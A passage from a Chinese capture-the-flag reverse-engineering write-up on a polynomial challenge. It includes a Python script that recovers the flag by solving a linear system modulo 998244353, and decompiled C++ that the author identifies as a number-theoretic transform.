<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> n</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> a[j]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">i</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            a[i], a[j] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> a[j], a[i]</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span></span>
<span><span style="color: #D6DEEB">    inv </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">pow</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">a</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">],</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> mod</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> n </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        a[i]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">k</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> a[i]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">k</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> inv </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">n</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> j:</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">        mul </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> a[j]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">i</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> n </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            a[j]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">k</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (a[j]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">k</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> mul </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> a[i]</span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">k</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">%</span><span style="color: #D6DEEB"> mod</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">n</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">chr</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">a</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">n</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">end</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;&#39;</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">mod </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">998244353</span></span>
<span></span>
<span><span style="color: #403F53">c </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">00000CB0</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">168C83AC</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0D1D79D4</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0228A0DD</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">00E57451</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">25F3BF43</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0F1653F7</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">395B969F</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">37198928</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">1651D179</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">20F1DF11</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">38F4DC2B</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">37CDD474</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2043323C</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0E4CB532</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">14FE0ADA</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2DADCE9D</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2C325FFB</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">00D9357C</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">1C90D4E6</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">19A7E972</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">24EAABA9</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2C2A70ED</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">315995C6</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">1E48BE27</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">099C05B0</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0EE775B0</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">27F52AA6</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">136F26DB</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">05CE66CF</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">37F9958D</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2D634F37</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0F424CE3</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2348C868</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0A16629F</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">2ACC2B38</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">0F7FEB61</span><span style="color: #403F53">,</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">159215F5</span><span style="color: #403F53">,</span></span>
<span><span style="color: #111111">]</span></span>
<span></span>
<span><span style="color: #403F53">n </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">c</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #403F53">a </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">n</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    a.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #111111">[</span><span style="color: #4876D6">pow</span><span style="color: #403F53">(</span><span style="color: #4876D6">i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">1</span><span style="color: #111111">,</span><span style="color: #4876D6"> j</span><span style="color: #111111">,</span><span style="color: #4876D6"> mod</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">for</span><span style="color: #4876D6"> j </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> range</span><span style="color: #403F53">(</span><span style="color: #4876D6">n</span><span style="color: #403F53">)</span><span style="color: #111111">]</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #111111">[</span><span style="color: #4876D6">c</span><span style="color: #403F53">[</span><span style="color: #4876D6">i</span><span style="color: #403F53">]</span><span style="color: #111111">]</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">n</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #111111">,</span><span style="color: #4876D6"> n</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> a[j]</span><span style="color: #111111">[</span><span style="color: #403F53">i</span><span style="color: #111111">]</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            a[i], a[j] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> a[j], a[i]</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span></span>
<span><span style="color: #403F53">    inv </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">pow</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">[</span><span style="color: #4876D6">i</span><span style="color: #403F53">]</span><span style="color: #111111">[</span><span style="color: #4876D6">i</span><span style="color: #111111">],</span><span style="color: #4876D6"> </span><span style="color: #994CC3">-</span><span style="color: #AA0982">1</span><span style="color: #111111">,</span><span style="color: #4876D6"> mod</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> k </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #111111">,</span><span style="color: #4876D6"> n </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        a[i]</span><span style="color: #111111">[</span><span style="color: #403F53">k</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> a[i]</span><span style="color: #111111">[</span><span style="color: #403F53">k</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span><span style="color: #403F53"> inv </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> j </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">n</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> i </span><span style="color: #994CC3">==</span><span style="color: #403F53"> j:</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">        mul </span><span style="color: #994CC3">=</span><span style="color: #403F53"> a[j]</span><span style="color: #111111">[</span><span style="color: #403F53">i</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> k </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #111111">,</span><span style="color: #4876D6"> n </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            a[j]</span><span style="color: #111111">[</span><span style="color: #403F53">k</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (a[j]</span><span style="color: #111111">[</span><span style="color: #403F53">k</span><span style="color: #111111">]</span><span style="color: #403F53"> </span><span style="color: #994CC3">-</span><span style="color: #403F53"> mul </span><span style="color: #994CC3">*</span><span style="color: #403F53"> a[i]</span><span style="color: #111111">[</span><span style="color: #403F53">k</span><span style="color: #111111">]</span><span style="color: #403F53">) </span><span style="color: #994CC3">%</span><span style="color: #403F53"> mod</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">n</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">chr</span><span style="color: #403F53">(</span><span style="color: #4876D6">a</span><span style="color: #403F53">[</span><span style="color: #4876D6">i</span><span style="color: #403F53">]</span><span style="color: #111111">[</span><span style="color: #4876D6">n</span><span style="color: #111111">]</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">end</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;&#39;</span><span style="color: #403F53">)</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/poly-flag1.f9c4a6d2.webp"><img srcset="/assets/poly-flag1.89714fac.png" loading="lazy" src="/assets/poly-flag1.89714fac.png" width="437" height="46" alt="flag1"></picture></p>
<h4 id="level-2-10" class="heading"><a href="#level-2-10" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>反编译发现多项式长度被扩充到了 2 的幂<span class="mojikumi-line-start">（</span>其实到这里如果是 OIer 应该已经可以看出来了<span class="mojikumi-line-end">；</span><s>其实看到模数甚至题目名就应该早猜到了</s><span class="mojikumi">）</span><span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-28"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-28--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">bVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> std::</span><span style="color: #82AAFF">__lg</span><span style="color: #D6DEEB">(</span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">2f</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">n </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> (bVar1 </span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB"> </span><span style="color: #FFEB95">0x</span><span style="color: #F78C6C">1f</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">a </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">malloc</span><span style="color: #D6DEEB">((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)n </span><span style="color: #C792EA">&lt;&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #82AAFF">memset</span><span style="color: #D6DEEB">(a,</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">,(</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)n </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #403F53">bVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> std::</span><span style="color: #4876D6">__lg</span><span style="color: #403F53">(</span><span style="color: #AA0982">0x2f</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">n </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> (bVar1 </span><span style="color: #994CC3">&amp;</span><span style="color: #403F53"> </span><span style="color: #AA0982">0x1f</span><span style="color: #403F53">);</span></span>
<span><span style="color: #403F53">a </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">malloc</span><span style="color: #403F53">((</span><span style="color: #994CC3">long</span><span style="color: #403F53">)n </span><span style="color: #994CC3">&lt;&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">);</span></span>
<span><span style="color: #4876D6">memset</span><span style="color: #403F53">(a,</span><span style="color: #AA0982">0</span><span style="color: #403F53">,(</span><span style="color: #994CC3">long</span><span style="color: #403F53">)n </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #AA0982">4</span><span style="color: #403F53">);</span></span></code></pre></div></section>
<p>后面调用了一个函数<span class="mojikumi-line-end">，</span>核心部分如下<span class="mojikumi-line-end">，</span>确认是 <a href="https://oi-wiki.org/math/poly/ntt/">NTT</a><span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C++ 代码块" data-v-ad49d235>C++</h5><ile-root id="ile-29"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-29--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #D6DEEB">k </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> n;</span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> k)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    k </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">/</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; i </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> n; i </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> (j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">; j </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> k; j </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            uVar3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)(</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">DAT_00505280 </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(k </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">            local_38 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)(a </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> i) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">            local_34 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)(a </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)(k </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB">);</span></span>
<span><span style="color: #D6DEEB">            iVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> i;</span></span>
<span><span style="color: #D6DEEB">            uVar2 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> mint::operator</span><span style="color: #C792EA">+</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">local_38, </span><span style="color: #82AAFF">SUB41</span><span style="color: #D6DEEB">(local_34, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)iVar1 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> a) </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> uVar2;</span></span>
<span><span style="color: #D6DEEB">            local_30 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> mint::operator</span><span style="color: #C792EA">-</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">local_38, </span><span style="color: #82AAFF">SUB41</span><span style="color: #D6DEEB">(local_34, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">            iVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> k </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j;</span></span>
<span><span style="color: #D6DEEB">            uVar3 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> mint::operator</span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">((mint </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)</span><span style="color: #C792EA">&amp;</span><span style="color: #D6DEEB">local_30, </span><span style="color: #82AAFF">SUB41</span><span style="color: #D6DEEB">(uVar3, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">));</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">(undefined4 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB">)((</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB">)iVar1 </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">4</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> a) </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> uVar3;</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
